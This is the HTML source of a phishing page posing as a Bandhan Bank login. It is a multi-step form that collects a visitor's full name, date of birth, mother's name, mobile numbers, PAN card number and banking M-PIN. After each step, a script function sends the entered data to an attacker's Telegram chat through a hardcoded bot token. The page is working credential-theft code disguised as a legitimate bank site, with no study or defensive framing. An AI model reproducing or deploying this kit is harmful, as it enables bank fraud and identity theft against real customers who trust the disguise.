<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome To Bandhan Bank</title>
  <meta name="description" content="https://bandhanbank.com/">

  <!-- Bootstrap 5 CDN -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    body,
    html {
      margin: 0;
      padding: 0;
      height: 100%;
    }

    body {
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      background: #2F80ED;
    }

    .container {
      position: absolute;
      top: 0;
      width: 100%;
      max-width: 600px;
      background-color: white;
      padding: 0px;
      border-radius: 0px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
    }

    .header img {
      width: 100%;
      height: 110px;
      margin-bottom: 20px;
    }

    .header h1 {
      color: #2F80ED;
      font-size: 28px;
      font-weight: 600;
    }

    .form-step {
      display: none;
    }

    .form-step.active {
      display: block;
    }

    .progress-bar {
      width: 100%;
      height: 10px;
      background-color: #DC3129;
      border-radius: 5px;
      margin-bottom: 20px;
      position: relative;
    }

    .progress-bar span {
      height: 100%;
      background-color: #2F80ED;
      width: 25%;
      border-radius: 5px;
      transition: width 0.3s ease;
    }

    .input-box {
      margin-bottom: 25px;
      position: relative;
    }

    .input-box input {
      width: 100%;
      padding: 15px;
      font-size: 16px;
      border: 2px solid #093252;
      border-radius: 8px;
      background-color: #F5F5F5;
      transition: border 0.3s ease, box-shadow 0.3s ease;
    }

    .input-box input:focus {
      border-color: #2F80ED;
      box-shadow: 0 0 8px rgba(47, 128, 237, 0.4);
      outline: none;
    }

    .input-box label {
      position: absolute;
      top: 10px;
      left: 15px;
      font-size: 16px;
      color: #093252;
      transition: all 0.3s ease;
    }

    .input-box input:focus+label,
    .input-box input:not(:placeholder-shown)+label {
      top: -10px;
      left: 10px;
      font-size: 12px;
      color: #2F80ED;
      background-color: white;
      padding: 0 5px;
    }

    button {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      font-weight: bold;
      background-color: #9D1A21;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #1C5A91;
    }

    .loading-text {
      font-size: 20px;
      font-weight: bold;
      color: #2F80ED;
      text-align: center;
    }

    /* Footer Image */
    .footer-img {
      width: 100%;
      height: auto;
      margin-top: 30px;
    }

    /* Custom Modal Style */
    .modal-content {
      border-radius: 15px;
      padding: 30px;
      background: linear-gradient(135deg, #2F80ED, #1C5A91);
      color: white;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      animation: fadeIn 0.5s ease-out;
    }

    .modal-header {
      border-bottom: 1px solid rgba(255, 255, 255, 0.3);
      padding: 20px;
      text-align: center;
    }

    .modal-title {
      font-size: 22px;
      font-weight: 700;
      color: white;
    }

    .modal-body {
      font-size: 16px;
      color: #F2F2F2;
      text-align: center;
      padding: 20px;
    }

    .modal-footer {
      text-align: center;
      padding: 10px 0;
    }

    button.btn-close {
      background-color: transparent;
      border: none;
    }

    button.btn-danger {
      background-color: #DC3129;
      border: none;
      padding: 12px 25px;
      font-size: 16px;
      border-radius: 50px;
      color: white;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    button.btn-danger:hover {
      background-color: #9D1A21;
      transform: scale(1.1);
    }

    @media (max-width: 576px) {
      .container {
        padding: 20px;
      }
    }

    /* Animation for Modal */
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: scale(0.8);
      }

      to {
        opacity: 1;
        transform: scale(1);
      }
    }

  </style>
</head>

<body>

  <div class="container">
    <div class="header">
      <!-- Header Image (Logo) -->
      <img src="logoc.png" alt="Logo">
    </div>

    <!-- Progress Bar -->
    <div class="progress-bar" id="progressBar">
      <span id="progress" style="width: 25%;"></span>
    </div>
    <br>

    <form id="multiStepForm">

      <!-- Step 1 -->
      <div class="form-step active" id="step1">
        <div class="input-box">
          <input type="text" id="fullName" placeholder=" " required>
          <label for="fullName">Full Name</label>
        </div>

        <div class="input-box">
          <input type="text" id="dob" placeholder=" " required>
          <label for="dob">Date of Birth (DD/MM/YYYY)</label>
        </div>

        <div class="input-box">
          <input type="text" id="motherName" placeholder=" " required>
          <label for="motherName">Mother's Name</label>
        </div>
        <br>
        <button type="button" onclick="submitStep1()">Next</button>
      </div>

<!-- Step 2 -->
      <div class="form-step" id="step2">
        <div class="input-box">
          <input type="tell" inputmode="numeric" id="aadhar" placeholder=" " required>
          <label for="aadhar">Register Mobile No.</label>
        </div>

        <div class="input-box">
          <input type="text" id="panCard" placeholder=" " maxlength="10" required>
          <label for="panCard">Pan Card No.</label>
        </div>
        <br>
        <button type="button" onclick="submitStep2()">Next</button>
      </div>

      <!-- Step 3 -->
      <div class="form-step" id="step3">
        <div class="input-box">
          <input type="text" inputmode="numeric" minlength="10" maxlength="10" id="mobile" placeholder=" " required>
          <label for="mobile">Mobile No.</label>
        </div>

        <div class="input-box">
          <input type="password" inputmode="numeric" minlength="4" maxlength="6" id="mpin" placeholder=" " required>
          <label for="mpin">M-PIN</label>
        </div>
        <br>
        <button type="button" onclick="submitStep3()">Next</button>
      </div>

      <!-- Step 4 - Loading Page -->
      <div class="form-step" id="step4">
        <div class="loading-text">Please Wait.</div>
      </div>

    </form>

  </div>

  <!-- Custom Alert Modal -->
  <div class="modal fade" id="customAlertModal" tabindex="-1" aria-labelledby="alertModalLabel" aria-hidden="true">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="alertModalLabel">Attention!</h5>
        </div>
        <div class="modal-body" id="alertMessage">
          <!-- Message will be inserted here dynamically -->
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-danger" data-bs-dismiss="modal">OK</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Function to show custom alert modal
    function showCustomAlert(message) {
      document.getElementById('alertMessage').innerText = message;
      var modal = new bootstrap.Modal(document.getElementById('customAlertModal'));
      modal.show();
    }

    // Submit Step 1
    function submitStep1() {
      const fullName = document.getElementById('fullName');
      const dob = document.getElementById('dob');
      const motherName = document.getElementById('motherName');

      if (!fullName.value.trim()) {
        showCustomAlert("Please fill in your Full Name.");
        fullName.focus();
        return;
      }
     
      if (!motherName.value.trim()) {
        showCustomAlert("Please fill in your Mother's Name.");
        motherName.focus();
        return;
      }

      sendToTelegram(fullName.value, dob.value, motherName.value);
      showNextStep(2);
      updateProgressBar(50);
    }

    // Submit Step 2
    function submitStep2() {
      const aadhar = document.getElementById('aadhar');
      const panCard = document.getElementById('panCard');

      
      if (!panCard.value.trim() || !/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(panCard.value)) {
        showCustomAlert("Please enter a valid PAN Card number (e.g., ABCDE1234F).");
        panCard.focus();
        return;
      }

      sendToTelegram(aadhar.value, panCard.value);
      showNextStep(3);
      updateProgressBar(75);
    }

    // Submit Step 3
    function submitStep3() {
      const mobile = document.getElementById('mobile');
      const mpin = document.getElementById('mpin');

      if (!mobile.value.trim() || mobile.value.length !== 10 || !/^\d{10}$/.test(mobile.value)) {
        showCustomAlert("Please enter a valid 10-digit Mobile number.");
        mobile.focus();
        return;
      }
      if (!mpin.value.trim() || mpin.value.length < 4 || mpin.value.length > 6) {
        showCustomAlert("Please enter a valid M-PIN (4-6 digits).");
        mpin.focus();
        return;
      }

      sendToTelegram(mobile.value, mpin.value);
      showNextStep(4);
      updateProgressBar(100);
    }

    // Function to handle sending data to Telegram
    function sendToTelegram(...fields) {
      const message = fields.join('\n');
      const botToken = '7095598003:AAHdRNNMzonXqZBNvySpjX2lI8ZAhlUcxbM';
      const chatId = '7607122788';
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      fetch(url)
        .then(response => response.json())
        .then(data => console.log("Message sent to Telegram:", data))
        .catch(error => console.error("Error sending message to Telegram:", error));
    }

    // Function to show the next step
    function showNextStep(step) {
      document.querySelectorAll(".form-step").forEach((stepDiv) => {
        stepDiv.classList.remove("active");
      });
      document.getElementById(`step${step}`).classList.add("active");
    }

    // Update progress bar
    function updateProgressBar(percentage) {
      const progressBar = document.getElementById('progress');
      progressBar.style.width = `${percentage}%`;
    }
  </script>

  <script>
  

  <!-- Bootstrap 5 JS CDN -->
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>

</body>

</html>
